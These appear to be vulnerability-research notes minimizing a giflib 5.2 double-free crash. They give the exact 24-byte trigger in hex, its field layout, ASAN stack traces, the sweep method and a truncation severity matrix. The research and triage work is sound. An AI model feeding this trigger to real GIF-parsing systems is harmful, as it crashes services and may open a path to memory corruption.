# Worked case: giflib double-free trigger minimization (2026-08-09)

Continuation of `giflib-doublefree-case.md`. The 52-byte trigger was minimized to a
**proven 24-byte floor**, valid-vs-truncated severity boundary was mapped, and the crash
was re-proven in a plain (non-ASAN) glibc build. All runs on the Kali VM
(painbaba@192.168.29.35) against `~/gifwork/fuzz_gif_asan` (clang 21.1.8, AOSP giflib 5.2,
source md5-identical to the Windows copy).

## Result: canonical 24-byte trigger

Hex: `474946383961000000000000002c00000000000000000002`
Saved as `gif_min_trigger.bin` (also `gif_min_trigger_w1.bin`, 25B valid-dims variant).

```
GIF89a                       magic — only the "GIF" prefix is validated (GIF_VERSION_POS=3)
00 00 00 00 00 00 00         logical screen desc: w=0, h=0, no GCT, bg=0, aspect=0
2c                           image descriptor introducer
00 00 00 00 00 00 00 00      left=0, top=0, width=0, height=0
00                           packed (no local color table)
02                           LZW min code size
```

Crash chain (ASAN): `free` ← `GifFreeSavedImages gifalloc.c:421` ← `DGifCloseFile
dgif_lib.c:698`; freed-by: `reallocarray` ← `DGifDecreaseImageCounter dgif_lib.c:1160` ←
`DGifSlurp dgif_lib.c:1199` (width≤0 check). Region = the 56-byte SavedImage block.

## Why 24 is the floor (structural, then empirical)

- DGifOpen needs 6 magic + 7 screen-desc bytes = 13; shorter → open fails, no crash.
- `ImageCount` only increments AFTER the FULL image descriptor parses: 0x2C + 8 desc bytes
  + packed + LZW-min byte (read inside `DGifSetupDecompress`). Truncating the descriptor or
  the LZW-min byte → `DGifGetImageDesc` fails → no ImageCount++ → `DGifDecreaseImageCounter`
  never fires.
- Empirically: 23/22/21/20/14/13-byte candidates all clean (rc=0); every 24-byte candidate
  crashes — `w=0`, `h=0`, `GIF87a`, junk version `GIFzzz`, huge dims (w=h=65535 → OOM path
  dgif_lib.c:1212). Setting the local-color-table flag (0x80) without supplying LCT bytes
  breaks the descriptor parse → clean (consistency check).

## Sweep design (ran ON Kali, ~1–2 min for ~150 variants)

- truncations `data[:N]`, N = 1..51 of the 52B trigger → only **n=44** crashed (original
  GCT+GCE waste 20 bytes vs. the clean minimal; below 44 the LZW-min byte is gone).
- byte-removals → nothing below 24 (single deletions can't drop the GCT+GCE structure).
- constructed candidates → all 24B crash, 23B clean (floor proof).
- Oracle per variant: `mkdir c && cp v.bin c/ && ASAN_OPTIONS=abort_on_error=1:detect_leaks=0
  ../fuzz_gif_asan -runs=1 c/` → exit 134 + `attempting double-free`, or exit 0. Classify as
  DOUBLEFREE / CRASH / ok / TIMEOUT(20s).
- Determinism: 5/5 runs of the 24B trigger → exit 134.

## Valid vs truncated severity matrix (the report's boundary)

| Input | Result |
|---|---|
| Fully valid PIL GIFs (1×1…640×480, 1/2/3-frame, palette) | clean, rc=0 |
| Real-world `giflib/tests/wedge.gif` (15 KB) | clean |
| Valid single-frame GIF cut @70%/90% (39B/51B of a 57B file) | **double-free** |
| Valid single-frame cut @30%/50% (too short to complete descriptor) | clean |
| 2-frame GIF cut mid-frame-1 raster (@50%) | **double-free** |
| 2-frame / 3-frame cut after frame 1 (@70%/90%) | clean (ImageCount N→N-1, realloc OK) |

Rule: the double-free fires iff the FIRST image errors (ImageCount 1→0). Fully valid GIFs
never hit an error path → never crash. Realistic reach = any normal single-frame GIF that
gets truncated/corrupted mid-file (partial downloads, cut-off attachments), or any
multi-frame GIF whose FIRST frame is broken.

## Plain (non-ASAN) native proof

Rebuilt same sources without sanitizers + tiny main (DGifOpen memory-reader → DGifSlurp →
DGifCloseFile):

```
$ ./gif_runner_plain min24.bin
DGifOpen OK, calling DGifSlurp...
DGifSlurp rc=0 (ImageCount=0), calling DGifCloseFile...
free(): double free detected in tcache 2   → abort (exit 134)
```

Valid-GIF control: `DGifSlurp rc=1 (ImageCount=1)` → close OK, exit 0. Same result on the
25B valid-dims variant. ASAN + plain glibc abort on identical input = allocator-independent
(consistent with UCRT/Windows and scudo/bionic semantics from the parent case).

## Re-verification lesson

libFuzzer's earlier `crash2_*` artifacts (24–25B, junk magic like `GIFq.M`) were re-run
against the current binary before being trusted — they crash only because giflib validates
just the "GIF" prefix. Always re-verify old artifacts against the CURRENT harness/binary;
stale artifacts from a different build can mislead triage.

## Artifacts (Windows aosp-audit\ / Kali ~/gifwork)

- `gif_min_trigger.bin` (24B canonical), `gif_min_trigger_w1.bin` (25B valid dims)
- `gif_small/small0-4.bin` (libFuzzer 24–25B artifacts, re-verified)
- `gif_mini_sweep.py` (sweep script — runs on Kali), `gif_runner_plain.c` (plain driver),
  `gif_verify_min.sh` (determinism + stack + plain-build verification)
- Kali: `~/gifwork/mini_sweep/` (all variants + results), `~/gifwork/gif_runner_plain`
